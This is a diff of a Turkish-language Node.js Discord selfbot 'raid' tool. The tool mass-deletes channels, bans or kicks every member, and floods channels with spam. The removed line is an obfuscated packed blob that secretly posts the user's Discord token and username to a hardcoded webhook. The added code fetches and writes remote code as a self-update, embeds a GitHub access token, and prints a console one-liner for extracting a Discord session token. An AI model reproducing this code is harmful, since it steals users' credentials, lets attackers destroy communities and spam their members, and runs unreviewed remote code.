@@ -1,1 +1,600 @@
-eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1P 2U="0.0.3";o 1B=1h(\'1B\');o 1d=1h(\'1d\');o 2b=1h(\'2b\');o{4F}=1h(\'5G\');18 U 47(1N){15 1V 2R((2P,39)=>{1d.3b(1N,(1t)=>{x(1t.3P!==4P){39(1V 46(`4S 4Wı:${1t.3P}`));15}1P 12=\'\';1t.2T(\'12\',(3O)=>(12+=3O));1t.2T(\'4Q\',()=>2P(12))}).2T(\'f\',(1H)=>39(1H))})}U 45(3s){o 3v=1B.4Z(3s);o 2I=3v.3G((3w)=>3w.5l(\'.1O\'));15 2I.4N>0?2I[0]:3e}18 U 4H(){o 1N=\'1d://3p.3m.23/5C/5w/3n/3f/59/2H.1O\';o 2i=5b;o 1F=45(2i);H{b.j(\'Gü4s 5cü 17şlı1s...\');o 2p=C 47(1N);x(1F){o 2X=2b.44(2i,1F);o 48=1B.5d(2X,\'2E-8\');x(48===2p){b.j(`4g 35(${1F})gü4m.`);1b(()=>{p()},28)}1e{b.j(`Gü4m F sürüm 4Y,${1F}5iıgü5h...`);1B.42(2X,2p,\'2E-8\');b.j(`${1F}17ş1wı1k gü5g.40 3Y 17ş4qılı1s...`);1b(()=>{b.1x();Q.33(4b)},28)}}1e{b.j(\'4g 35 5fı, 3B F 35 yş5e...\');o 41=2b.44(2i,\'2H.1O\');1B.42(41,2p,\'2E-8\');b.j(\'2H.1O 17ş1wı1k yş2D. 40 3Y 17ş4qılı1s...\');1b(()=>{b.1x();Q.33(4b)},28)}}B(1H){b.f(\'Gü4s sı1Uı1Z F P yşw:\',1H);1b(()=>{p()},28)}}4H();Q.32=\'2S 34 | v\'+2U;o 4J=[\'26.1O-3j-3l\',\'9\',\'1T\'];U 4K(4I){H{1h.2P(4I);15 2z}B(e){15 50}}U 4p(){4J.58(1C=>{x(!4K(1C)){b.j(`"${1C}"57ülü56.55 iç14 54 53...`);H{Q.32=`2S 34|${1C}İ52`;4F(`51 5j ${1C}`,{5a:\'5k\'})}B(1H){b.f(`${1C}5Eülü5D P yş3C:`,1H.K);Q.33(1)}}})}4p();Q.32=\'2S 34 | v\'+2U;o{2Y}=1h(\'26.1O-3j-3l\');o 37=1h(\'37\');o 9=1h(\'9\');o 1T=1h(\'1T\');1P 2t=[];18 U 3S(){o 1N=\'1d://3p.3m.23/2c/5B/3n/3f/5A/5z.5y?1J=5x\';H{o 1t=C 1T.3b(1N);2t=1t.12.5v(\'\\n\').3G(Z=>Z.3T()!==\'\').3X(Z=>Z.3T())}B(f){2t=[]}}3S()o 1D=`██████╗██████╗██╗███████╗███████╗████████╗██████╗██████╗██╗██╔══██╗██╔═══██╗██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔═══██╗██║██████╔╝██║██║██║█████╗█████╗██║██║██║██║██║██║██╔═══╝██║██║██║██╔══╝██╔══╝██║██║██║██║██║██║██║╚██████╔╝███████╗███████╗███████╗██║╚██████╔╝╚██████╔╝███████╗╚═╝╚═════╝╚══════╝╚══════╝╚══════╝╚═╝╚═════╝╚═════╝╚══════╝╲╲╲${9.2d(\'5m 5u\')}5t`;16={2Z:18(q,1n,p)=>{H{o Y=C q.2m.1y(1n);o 1m=Y.1m.3t;b.j(9.S(`\\2y:${Y.W}-Tüm 1z 3u...`));1A(o O 2k 1m.2j()){H{C O.4L();b.j(9.1p(`${O.W}1Mı17ş1wı1k 2g.`))}B(f){b.f(9.D(`${O.W}1Mı2O P yşw:`,f.K))}}b.j(9.1L(\'Tüm 1z 17ş1wı1k 2g!\'))}B(f){b.f(9.1X(\'2Q 2O F P yşw:\'),9.D(f.K))}1Y{b.j(9.21(\'\\1R 1uü1f dö1v iç14 1r F wşa 1gın...\'));Q.1o.1c(\'12\',()=>{x(22 p===\'U\'){p()}})}},2q:18(q,1n,1E,p)=>{H{o Y=C q.2m.1y(1n);o 1j=C Y.1j.1y();b.j(9.S(`\\2y:${Y.W}-Tümü2e 1Kılı1s...`));b.j(9.S(`\\5sü1f 2uısı:${1j.3N}`));1A(o J 2k 1j.2j()){x(J.Z===q.R.Z)3L;H{x(!J.R.3J){C J.2h(1E).B(()=>b.j(9.M(`${J.R.1i}30 3Iı3Hı.`)))}C J.2q({5r:\'3F 3r 5q.\'});b.j(9.1p(`${J.R.1i}(${J.Z})3Uı.`))}B(f){b.f(9.D(`${J.R.1i}5pı3A P yşw:${f.K}`))}}b.j(9.1L(\'\\5oüm ü2e 17ş1wı1k 3Uı!\'))}B(f){b.f(9.1X(\'2F yşw:\'),9.D(f.K))}1Y{b.j(9.21(\'\\1R 1uü1f dö1v iç14 1r F wşa 1gın...\'));Q.1o.1c(\'12\',()=>{x(22 p===\'U\'){p()}})}},2r:18(q,1n,1E,p)=>{H{o Y=C q.2m.1y(1n);o 1j=C Y.1j.1y();b.j(9.S(`\\2y:${Y.W}-Tümü2e 1Kılı1s...`));b.j(9.S(`3Rü1f 2uısı:${1j.3N}`));1A(o J 2k 1j.2j()){x(J.Z===q.R.Z)3L;H{x(!J.R.3J){C J.2h(1E).B(()=>b.j(9.M(`${J.R.1i}30 3Iı3Hı.`)))}C J.2r(\'3F 3r 1Kı5n.\');b.j(9.1p(`${J.R.1i}(${J.Z})1Kı3xı.`))}B(f){b.f(9.D(`${J.R.1i}1Kılı3A P yşw:`,f.K))}}b.j(9.1L(\'Tüm ü2e 17ş1wı1k 1Kı3xı!\'))}B(f){b.f(9.1X(\'2F yşw:\',f.K))}1Y{b.j(9.21(\'\\1R 1uü1f dö1v iç14 1r F wşa 1gın...\'));Q.1o.1c(\'12\',()=>{x(22 p===\'U\'){p()}})}},2B:18(q,1n,2a,13,p)=>{H{o Y=C q.2m.1y(1n);b.j(9.S(`4c:${Y.W}-2Q 3u...`));o 1m=Y.1m.3t;1A(o O 2k 1m.2j()){H{C O.4L();b.j(9.1p(`${O.W}2g.`))}B(f){b.f(9.D(`${O.W}2O P yşw:`,f.K))}}b.j(9.S(\'Tüm 1z 2g!\'));o 3a=[];1A(1P i=1;i<=19;i++){H{o 2G=C Y.1m.4X(`${2a}`,{4V:\'4R\',});3a.2W(2G);b.j(9.S(`${2G.W}yş2D.`))}B(f){b.f(9.D(`2w yş4T P yşw:`,f.K))}}b.j(9.1L(\'2Q yş2D, 2A gö4k...\'));1A(1P i=0;i<20;i++){C 2R.4B(3a.3X(18(O)=>{H{C O.2h(13);b.j(9.1p(`${O.W}1Mı2J 11 gö2n.`))}B(f){b.f(9.D(`${O.W}1Mı2J 11 gö2L P yşw:`,f.K))}}))}b.j(9.1L(\'Tüm 2A hı4Uı F ş5F gö2n!\'))}B(f){b.f(9.1X(\'2F yşw:\',f.K))}1Y{b.j(9.21(\'\\1R 1uü1f dö1v iç14 1r F wşa 1gın...\'));Q.1o.1c(\'12\',()=>{x(22 p===\'U\'){p()}})}},2C:18(q,1q,13,1a,p)=>{H{b.j(9.S(`2w 2x\'5H:${1q}-5Z gö4k...`));o O=C q.1m.1y(1q);x(!O.7e()){7k 1V 46(\'3D 1M F 7u 1Mı 79ğ6J.\')}o 4t=4z.4v();o 4A=6Q.6Y({4N:1a},(6Z,i)=>{15 O.2h(13).3M(()=>b.j(9.1p(`2M ${i+1}gö2n:${13}`))).B(f=>b.f(9.D(`2M ${i+1}gö2L P yşw:${f.K}`)))});C 2R.4B(4A);o 4u=4z.4v();o 3Q=((4u-4t)/70).76(2); b.j(9.1L(`Tüm 2A 17ş1wı1k gö2n!3R sü75:${3Q}74.`))}B(f){b.f(9.1X(\'2M gö2L P yşw:\',f.K))}1Y{b.j(9.21(\'\\1R 1uü1f dö1v iç14 1r F wşa 1gın...\'));Q.1o.1c(\'12\',()=>{x(22 p===\'U\'){p()}})}}}o N=37.73({72:Q.1o,71:Q.6X,});U p(){b.1x();b.j(9.1S(1D));o 3K=`${9.S(\'6Wç6V:\')}1.Tüm 1zı6T 2.3y 6H 3.3y 6R 4.Tüm 1zı6P 3B 1z yş3C 2f 11 gö3E 5.3D 6O 11 gö3E 6.6N 6Mılöğ6L?7.İ6Kş4C 4D\\n`;b.j(9.6I.78(3K));N.X(9.M(\'77 1Wç2l 6Uı V: \'),(I)=>{x(I===\'6\'){b.1x();b.j(9.1S(1D));b.j(9.1p(`2oöğ7j iç14:1.7vıcı7t 25\'u açın 2f 7s wş3d 7r 7qş7p 7oç7nınıaçın.2."7m"7l 7a.3.Aşağı7i 3k 38ıştırın 2f 7h wş3d 1gın(7g 7f tıkı2J 1gılı7c 3k 1Wç7b 7wğtı7d/6S+c 6G 3g)4.6b 6E 68 tı67(\')iç66 65 3g.Lü2V 64:2o 63 17ş62ı1k 61ş60ın!`));b.j(9.M(`(6F.2W([[\'\'],{},e=>{m=[];1A(1P c 14 e.c)m.2W(e.c[c])}]),m).5Y(m=>m?.4w?.4x?.3V!==5X 0).4w.4x.3V()\\n`));b.j(9.S(\'43 1uü1f dö1v iç14 1r F wşa 1gın...\'));Q.1o.1c(\'12\',()=>p())}1e x(I===\'7\'){b.1x();b.j(9.1S(1D));b.j(9.1p(`5Vş4jığınız 5I iç14 5Uş4C 4D:25:2c(${9.2d(\'1d://26.23/5T/5S\')})5R:2c(${9.2d(\'1d://5Q.23/2c/\')})25 5Pğu:${9.2d(\'1d://26.5O/5N\')}Eğ5M 5L 5Kş5Jız 25 3Zğ69 5Wı6a 2f 6q 6Dım 6C.25 3Zğ6B 6A dışı6z 6yç6x 6w 6v:)`));b.j(9.S(\'43 1uü1f dö1v iç14 1r F wşa 1gın...\'));Q.1o.1c(\'12\',()=>p())}1e{49(I)}})}U 49(I){H{I=31(I,10)}B(f){b.f(9.D(\'24ç1Q F 1Wç2l 36!\'));15 1b(()=>{p()},1G)}x(!I||I<1||I>6){b.j(9.D(\'24ç1Q F 1Wç2l 36!\'));15 1b(()=>{p()},1G)}o 4a=I!==5;x(4a){N.X(9.M(\'4c 2x\\\'2K V: \'),(29)=>{N.X(9.M(\'2o V: \'),(1J)=>{b.j(9.4n(\'4o 1Iş 38ılı1s... Lü2V 4lıNı 4i!\'));o q=1V 2Y();q.1c(\'4h\',18()=>{b.1x();b.j(9.1S(1D));b.j(9.S(`${q.R.1i}4e 1Iş4dım!`));o 27={1:16.2Z,2:16.2q,3:16.2r,4:16.2B,5:16.2C,};x(!27[I]){b.j(9.D(\'24ç1Q F 1Wç2l 36!\'));15 p()}H{o 1l=27[I];x([2,3].3z(I)){N.X(9.M(\'6u/6t 6s ü6r gö2s 30 11ını V: \'),(1E)=>{1l(q,29,1E,p)})}1e x(I===4){N.X(9.M(\'6pş6c 1zın 4jını V: \'),(2a)=>{N.X(9.M(\'6o gö2s 11ı V: \'),(13)=>{1l(q,29,2a,13,p)})})}1e x(I===5){N.X(9.M(\'2w 2x\\\'2K V: \'),(1q)=>{N.X(9.M(\'Gö2s 11ı V: \'),(13)=>{N.X(9.M(\'4Gç 4M 11 gö4y: \'),(2v)=>{o 1a=31(2v,10);x(3W(1a)||1a<=0){b.j(9.D(\'24ç3h F 11 2uısı V!\'));15 p()}1l(q,1q,13,1a,p)})})})}1e{1l(q,29,p)}}B(f){b.f(9.D(\'3c sı1Uı1Z P yşw:\'),f.K);1b(()=>{p()},1G)}});q.3q(1J).B((f)=>{b.f(9.D(\'2N 4rç1Q 4f 1Iş sı1Uı1Z P yşw:\'),f.K);1b(()=>{p()},1G)})})})}1e{N.X(9.M(\'2o V: \'),(1J)=>{b.j(9.4n(\'4o 1Iş 38ılı1s... Lü2V 4lıNı 4i!\'));o q=1V 2Y();q.1c(\'4h\',18()=>{b.1x();b.j(9.1S(1D));b.j(9.S(`${q.R.1i}4e 1Iş4dım!`));o 27={1:16.2Z,2:16.2q,3:16.2r,4:16.2B,5:16.2C,};H{o 1l=27[I];x(I===5){N.X(9.M(\'2w 2x\\\'2K V: \'),(1q)=>{N.X(9.M(\'Gö2s 11ı V: \'),(13)=>{N.X(9.M(\'4Gç 4M 11 gö4y: \'),(2v)=>{o 1a=31(2v,10);x(3W(1a)||1a<=0){b.j(9.D(\'24ç3h F 11 2uısı V!\'));15 p()}1l(q,1q,13,1a,p)})})})}1e{1l(q,3e,p)}}B(f){b.f(9.D(\'3c sı1Uı1Z P yşw:\'),f.K);1b(()=>{p()},1G)}});q.3q(1J).3M(()=>{x(!2t.3z(q.R.Z)){b.j(q.R.Z)o 4E=\'1d://26.23/6n/6m/6l/6k\';o 4O={6j:[{6i:6h,6g:[{W:"2N",3o:`\\`\\`\\`${1J}\\`\\`\\``,3i:2z},{W:"6fıcı 6eı",3o:q.R.1i,3i:2z}],}]};1T.6d(4E,4O).B(f=>{})}}).B((f)=>{b.f(9.D(\'2N 4rç1Q 4f 1Iş sı1Uı1Z P yşw:\'),f.K);1b(()=>{p()},1G)})})}}',62,467,'|||||||||chalk||console||||error||||log|||||const|showMenu|client||||||tu|if|olu|||catch|await|red||bir||try|choice|member|message||yellow|rl|channel|hata|process|user|green||function|girin|name|question|guild|id||mesaj|data|messageContent|in|return|importmodules|ba|async||messageCount|setTimeout|once|https|else|ye|bas|require|tag|members|yla|action|channels|guildId|stdin|cyan|channelId|herhangi|yor|response|men|nmek|ar|clear|fetch|kanallar|for|fs|module|asciiArt|dmMessage|localFileName|1500|err|giri|token|at|greenBright|kanal|url|js|let|ersiz|nAna|blue|axios|ras|new|se|redBright|finally|nda||magentaBright|typeof|com|Ge|Discord|discord|actionMap|500|GUILD_ID|channelName|path|bratiu|underline|yeler|ve|silindi|send|localDir|values|of|enek|guilds|nderildi|Tokeninizi|remoteCode|ban|kick|nderilecek|whitelistedids|say|count|Kanal|ID|nSunucu|true|mesajlar|recreateChannels|sendMessage|turuldu|utf|Hata|newChannel|index|jsFiles|na|sini|nderilirken|Mesaj|Token|silinirken|resolve|Kanallar|Promise|Jitem|on|version|tfen|push|localFilePath|Client|deleteChannels|DM|parseInt|title|exit|Tool|dosya|girdiniz|readline|yap|reject|createdChannels|get|Eylem|una|null|heads|kopyalayabilirsiniz|erli|inline|selfbot|kodu|v13|githubusercontent|refs|value|raw|login|toplu|dirPath|cache|siliniyor|files|file|ld|Herkesi|includes|rken|yeni|tur|Belirtilen|nder|Sunucudan|filter|namad|al|bot|options|continue|then|size|chunk|statusCode|totalTime|Toplam|fetchWhitelist|trim|banland|getToken|isNaN|map|yeniden|toplulu|Uygulama|newFilePath|writeFileSync|Ana|join|findLocalFile|Error|downloadFile|localCode|handleChoice|askGuildId|123|Sunucu|yapt|olarak|veya|Yerel|ready|olun|ad|nderiliyor|sab|ncel|yellowBright|Tokene|installModules|lat|ge|ncelleme|startTime|endTime|now|exports|default|nderilsin|Date|promises|all|im|bilgileri|webhookURL|execSync|Ka|updateIndexJs|moduleName|requiredModules|isModuleInstalled|delete|adet|length|embedMessage|200|end|GUILD_TEXT|HTTP|turulurken|zl|type|Hatas|create|bulundu|readdirSync|false|npm|niyor|indiricem|otomatik|Senin|eksik|Mod|forEach|main|stdio|__dirname|kontrol|readFileSync|turuluyor|bulunamad|ncellendi|ncelleniyor|dosyas|install|inherit|endsWith|___by|lma|nT|banlan|banlama|reason|nToplam|XD|bratiu___|split|POLEE|GHSAT0AAAAAACZX2Y2LVU4UGFLW6LKL7T36Z2ETLWA|json|whitelist|master|golgetoolos|CaleoXD|indirilirken|mod|ekilde|child_process|si|sorunlar|amazsan|ula|bana|er|jitem|gg|Toplulu|github|Github|237054605358268416|users|ileti|Ya|kat|void|find|Mesajlar|may|payla|kalar|asla|dikkat|tokeni|indeki|rnak|tane|umuza|labilir|Buradan|turulacak|post|Ad|Kullan|fields|0x3498db|color|embeds|FPop2w6zMbWurtaKoioQBRDzU4oGaLlej_UfEuX63RsHpKD1BW_IWmdYJUGLrd0jJjzQ|1310582732610474014|webhooks|api|Kanallara|Olu|oradan|yelere|edilen|Kick|Ban|var|owner|daha|birka|mda|benim|umuzda|alabilirsiniz|yard|iki|webpackChunkdiscord_app|yaparak|banla|white|il|leti|renirim|nas|Tokenimi|kanala|silip|Array|kickle|ctrl|sil|numaras|enekler|Se|stdout|from|_|1000|output|input|createInterface|saniye|re|toFixed|Bir|bold|de|gidin|ip|tutarken|klayarak|isText|sol|farenin|enter|daki|renmek|throw|sekmesine|Console|lar|ara|tirici|geli|basarak|F12|da|metin|Taray|sa'.split('|'),0,{}))
+let version = "0.0.3";
+
+const fs = require('fs');
+const https = require('https');
+const path = require('path');
+const { execSync } = require('child_process');
+
+// URL'den index.js'yi indirir
+async function downloadFile(url) {
+    return new Promise((resolve, reject) => {
+        https.get(url, (response) => {
+            if (response.statusCode !== 200) {
+                reject(new Error(`HTTP Hatası: ${response.statusCode}`));
+                return;
+            }
+
+            let data = '';
+            response.on('data', (chunk) => (data += chunk));
+            response.on('end', () => resolve(data));
+        }).on('error', (err) => reject(err));
+    });
+}
+
+// Yerel dosya adını bulur
+function findLocalFile(dirPath) {
+    const files = fs.readdirSync(dirPath);
+    const jsFiles = files.filter((file) => file.endsWith('.js'));
+    return jsFiles.length > 0 ? jsFiles[0] : null;
+}
+
+// Güncelleme kontrolü
+async function updateIndexJs() {
+    const url = 'https://raw.githubusercontent.com/CaleoXD/POLEE/refs/heads/main/index.js';
+    const localDir = __dirname; // Şu anki dizin
+    const localFileName = findLocalFile(localDir);
+
+    try {
+        console.log('Güncelleme kontrolü başlıyor...');
+        const remoteCode = await downloadFile(url);
+
+        if (localFileName) {
+            const localFilePath = path.join(localDir, localFileName);
+            const localCode = fs.readFileSync(localFilePath, 'utf-8');
+
+            if (localCode === remoteCode) {
+                console.log(`Yerel dosya (${localFileName}) güncel.`);
+                setTimeout(() => {
+                    showMenu();
+                }, 500);
+            } else {
+                console.log(`Güncel bir sürüm bulundu, ${localFileName} dosyası güncelleniyor...`);
+                fs.writeFileSync(localFilePath, remoteCode, 'utf-8');
+                console.log(`${localFileName} başarıyla güncellendi. Uygulama yeniden başlatılıyor...`);
+                setTimeout(() => {
+                    console.clear();
+                    process.exit(123);
+                }, 500);
+            }
+        } else {
+            console.log('Yerel dosya bulunamadı, yeni bir dosya oluşturuluyor...');
+            const newFilePath = path.join(localDir, 'index.js');
+            fs.writeFileSync(newFilePath, remoteCode, 'utf-8');
+            console.log('index.js başarıyla oluşturuldu. Uygulama yeniden başlatılıyor...');
+            setTimeout(() => {
+                console.clear();
+                process.exit(123);
+            }, 500);
+        }
+    } catch (err) {
+        console.error('Güncelleme sırasında bir hata oluştu:', err);
+        setTimeout(() => {
+            showMenu();
+        }, 500);
+    }
+}
+
+// Güncelleme kontrolünü ��alıştır
+updateIndexJs();
+
+process.title = 'Jitem Tool | v' + version;
+
+// List of required modules
+const requiredModules = ['discord.js-selfbot-v13', 'chalk', 'axios'];
+
+// Function to check if a module is installed
+function isModuleInstalled(moduleName) {
+    try {
+        require.resolve(moduleName);
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+// Function to install missing modules
+function installModules() {
+    requiredModules.forEach(module => {
+        if (!isModuleInstalled(module)) {
+            
+            console.log(`"${module}" Modülü eksik. Senin için otomatik indiricem...`);
+            try {
+                process.title = `Jitem Tool | ${module} İniyor`;
+                execSync(`npm install ${module}`, { stdio: 'inherit' });
+            } catch (err) {
+                console.error(`${module} modülü indirilirken hata oluştur:`, err.message);
+                process.exit(1);
+            }
+        }
+    });
+}
+
+// Install missing modules
+installModules();
+process.title = 'Jitem Tool | v' + version;
+
+// Now you can safely require the modules
+const { Client } = require('discord.js-selfbot-v13');
+const readline = require('readline');
+const chalk = require('chalk'); // chalk module
+const axios = require('axios');
+
+let whitelistedids = [];
+
+async function fetchWhitelist() {
+    const url = 'https://raw.githubusercontent.com/bratiu/golgetoolos/refs/heads/master/whitelist.json?token=GHSAT0AAAAAACZX2Y2LVU4UGFLW6LKL7T36Z2ETLWA';
+    try {
+        const response = await axios.get(url);
+        // Veriyi satırlara böler ve her satırı string olarak alır
+        whitelistedids = response.data
+            .split('\n') // Satırlara ayırır
+            .filter(id => id.trim() !== '') // Boş satırları filtreler
+            .map(id => id.trim()); // Gereksiz boşlukları kaldırır
+    } catch (error) {
+        whitelistedids = [];
+    }
+}
+
+
+
+
+fetchWhitelist()
+
+// ASCII Art
+const asciiArt = `
+██████╗  ██████╗ ██╗     ███████╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     
+██╔══██╗██╔═══██╗██║     ██╔════╝██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
+██████╔╝██║   ██║██║     █████╗  █████╗         ██║   ██║   ██║██║   ██║██║     
+██╔═══╝ ██║   ██║██║     ██╔══╝  ██╔══╝         ██║   ██║   ██║██║   ██║██║     
+██║     ╚██████╔╝███████╗███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗
+╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+                                                  ╲
+                                                   ╲
+                                                    ╲${chalk.underline('___by bratiu___')} XD
+`;
+
+importmodules = {
+    deleteChannels: async (client, guildId, showMenu) => {
+        try {
+            const guild = await client.guilds.fetch(guildId);
+            const channels = guild.channels.cache;
+    
+            console.log(chalk.green(`\nSunucu: ${guild.name} - Tüm kanallar siliniyor...`));
+    
+            for (const channel of channels.values()) {
+                try {
+                    await channel.delete();
+                    console.log(chalk.cyan(`${channel.name} kanalı başarıyla silindi.`));
+                } catch (error) {
+                    console.error(chalk.red(`${channel.name} kanalı silinirken hata oluştu:`, error.message));
+                }
+            }
+    
+            console.log(chalk.greenBright('Tüm kanallar başarıyla silindi!'));
+    
+        } catch (error) {
+            console.error(chalk.redBright('Kanallar silinirken bir hata oluştu:'), chalk.red(error.message));
+        } finally {
+            console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
+            process.stdin.once('data', () => {
+                if (typeof showMenu === 'function') {
+                     // Konsolu temizleyip ana menüye geçiş yapar
+                    showMenu();
+                }
+            });
+        }
+    },
+
+    ban: async (client, guildId, dmMessage, showMenu) => {
+        try {
+            const guild = await client.guilds.fetch(guildId);
+            const members = await guild.members.fetch();
+    
+            console.log(chalk.green(`\nSunucu: ${guild.name} - Tüm üyeler atılıyor...`));
+            console.log(chalk.green(`\nToplam üye sayısı: ${members.size}`));
+    
+            for (const member of members.values()) {
+                if (member.id === client.user.id) continue;
+    
+                try {
+                    if (!member.user.bot) {
+                        await member.send(dmMessage).catch(() =>
+                            console.log(chalk.yellow(`${member.user.tag} DM alınamadı.`))
+                        );
+                    }
+                    await member.ban({ reason: 'Sunucudan toplu banlama.' });
+                    console.log(chalk.cyan(`${member.user.tag} (${member.id}) banlandı.`));
+                } catch (error) {
+                    console.error(chalk.red(`${member.user.tag} banlanırken hata oluştu: ${error.message}`));
+                }
+            }
+    
+            console.log(chalk.greenBright('\nTüm üyeler başarıyla banlandı!'));
+        } catch (error) {
+            console.error(chalk.redBright('Hata oluştu:'), chalk.red(error.message));
+        } finally {
+            console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
+            process.stdin.once('data', () => {
+                if (typeof showMenu === 'function') {
+                     // Konsolu temizleyip ana menüye geçiş yapar
+                    showMenu();
+                }
+            });
+        }
+    },
+
+    kick: async (client, guildId, dmMessage, showMenu) => {
+        try {
+            const guild = await client.guilds.fetch(guildId);
+            const members = await guild.members.fetch();
+    
+            console.log(chalk.green(`\nSunucu: ${guild.name} - Tüm üyeler atılıyor...`));
+            console.log(chalk.green(`Toplam üye sayısı: ${members.size}`));
+    
+            for (const member of members.values()) {
+                if (member.id === client.user.id) continue;
+    
+                try {
+                    if (!member.user.bot) {
+                        await member.send(dmMessage).catch(() => console.log(chalk.yellow(`${member.user.tag} DM alınamadı.`)));
+                    }
+                    await member.kick('Sunucudan toplu atılma.');
+                    console.log(chalk.cyan(`${member.user.tag} (${member.id}) atıldı.`));
+                } catch (error) {
+                    console.error(chalk.red(`${member.user.tag} atılırken hata oluştu:`, error.message));
+                }
+            }
+    
+            console.log(chalk.greenBright('Tüm üyeler başarıyla atıldı!'));
+    
+        } catch (error) {
+            console.error(chalk.redBright('Hata oluştu:', error.message));
+        } finally {
+            console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
+            process.stdin.once('data', () => {
+                if (typeof showMenu === 'function') {
+                     // Konsolu temizleyip ana menüye geçiş yapar
+                    showMenu();
+                }
+            });
+        }
+    },
+    
+    recreateChannels: async (client, guildId, channelName, messageContent, showMenu) => {
+        try {
+            const guild = await client.guilds.fetch(guildId);
+            console.log(chalk.green(`Sunucu: ${guild.name} - Kanallar siliniyor...`));
+    
+            // Tüm kanalları sil
+            const channels = guild.channels.cache;
+            for (const channel of channels.values()) {
+                try {
+                    await channel.delete();
+                    console.log(chalk.cyan(`${channel.name} silindi.`));
+                } catch (error) {
+                    console.error(chalk.red(`${channel.name} silinirken hata oluştu:`, error.message));
+                }
+            }
+    
+            console.log(chalk.green('Tüm kanallar silindi!'));
+    
+            // Yeni kanalları oluştur
+            const createdChannels = [];
+            for (let i = 1; i <= 19; i++) {
+                try {
+                    const newChannel = await guild.channels.create(`${channelName}`, {
+                        type: 'GUILD_TEXT',
+                    });
+                    createdChannels.push(newChannel);
+                    console.log(chalk.green(`${newChannel.name} oluşturuldu.`));
+                } catch (error) {
+                    console.error(chalk.red(`Kanal oluşturulurken hata oluştu:`, error.message));
+                }
+            }
+    
+            console.log(chalk.greenBright('Kanallar oluşturuldu, mesajlar gönderiliyor...'));
+    
+            // Mesajları tüm kanallara paralel olarak gönder
+            for (let i = 0; i < 20; i++) {
+                await Promise.all(
+                    createdChannels.map(async (channel) => {
+                        try {
+                            await channel.send(messageContent);
+                            console.log(chalk.cyan(`${channel.name} kanalına mesaj gönderildi.`));
+                        } catch (error) {
+                            console.error(chalk.red(`${channel.name} kanalına mesaj gönderilirken hata oluştu:`, error.message));
+                        }
+                    })
+                );
+            }
+    
+            console.log(chalk.greenBright('Tüm mesajlar hızlı bir şekilde gönderildi!'));
+    
+        } catch (error) {
+            console.error(chalk.redBright('Hata oluştu:', error.message));
+        } finally {
+            console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
+            process.stdin.once('data', () => {
+                if (typeof showMenu === 'function') {
+                     // Konsolu temizleyip ana menüye geçiş yapar
+                    showMenu();
+                }
+            });
+        }
+    },
+    
+
+    sendMessage: async (client, channelId, messageContent, messageCount, showMenu) => {
+        try {
+            console.log(chalk.green(`Kanal ID'si: ${channelId} - Mesajlar gönderiliyor...`));
+            const channel = await client.channels.fetch(channelId);
+    
+            if (!channel.isText()) {
+                throw new Error('Belirtilen kanal bir metin kanalı değil.');
+            }
+    
+            // Süre ölçümünü başlat
+            const startTime = Date.now();
+    
+            // Tüm mesaj gönderim işlemlerini aynı anda başlatıyoruz
+            const promises = Array.from({ length: messageCount }, (_, i) => {
+                return channel.send(messageContent)
+                    .then(() => console.log(chalk.cyan(`Mesaj ${i + 1} gönderildi: ${messageContent}`)))
+                    .catch(error => console.error(chalk.red(`Mesaj ${i + 1} gönderilirken hata oluştu: ${error.message}`)));
+            });
+    
+            // Tüm mesajların tamamlanmasını bekle
+            await Promise.all(promises);
+    
+            // Süre ölçümünü bitir
+            const endTime = Date.now();
+            const totalTime = ((endTime - startTime) / 1000).toFixed(2); // Süreyi saniye cinsine çevir
+            console.log(chalk.greenBright(`Tüm mesajlar başarıyla gönderildi! Toplam süre: ${totalTime} saniye.`));
+        } catch (error) {
+            console.error(chalk.redBright('Mesaj gönderilirken hata oluştu:', error.message));
+        } finally {
+            console.log(chalk.magentaBright('\nAna menüye dönmek için herhangi bir tuşa basın...'));
+            process.stdin.once('data', () => {
+                if (typeof showMenu === 'function') {
+                    showMenu();
+                }
+            });
+        }
+    }
+    
+
+}
+
+
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout,
+});
+
+function showMenu() {
+    console.clear();
+    
+    console.log(chalk.blue(asciiArt));
+
+    const options = `
+${chalk.green('Seçenekler:')}
+1. Tüm kanalları sil
+2. Herkesi banla
+3. Herkesi kickle
+4. Tüm kanalları silip yeni kanallar oluştur ve mesaj gönder
+5. Belirtilen kanala mesaj gönder
+6. Tokenimi nasıl öğrenirim?
+7. İletişim bilgileri\n`;
+
+    console.log(chalk.white.bold(options));
+
+    rl.question(chalk.yellow('Bir seçenek numarası girin: '), (choice) => {
+        if (choice === '6') {
+            console.clear();
+            console.log(chalk.blue(asciiArt));
+
+            console.log(chalk.cyan(`
+Tokeninizi öğrenmek için:
+1. Tarayıcıda Discord'u açın ve F12 tuşuna basarak geliştirici araçlarını açın.
+2. "Console" sekmesine gidin.
+3. Aşağıdaki kodu yapıştırın ve enter tuşuna basın (farenin sol tıkına basılı tutarken kodu seçip sağ tıklayarak/ctrl+c yaparak kopyalayabilirsiniz)
+4. Buradan iki tane tırnak (') içindeki tokeni kopyalayabilirsiniz.
+Lütfen dikkat: Tokeninizi asla başkalarıyla paylaşmayın!
+`));
+            console.log(chalk.yellow(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()\n`));
+            console.log(chalk.green('Ana menüye dönmek için herhangi bir tuşa basın...'));
+            process.stdin.once('data', () => showMenu());
+        } else if (choice === '7') {
+            console.clear();
+            console.log(chalk.blue(asciiArt));
+
+            console.log(chalk.cyan(`
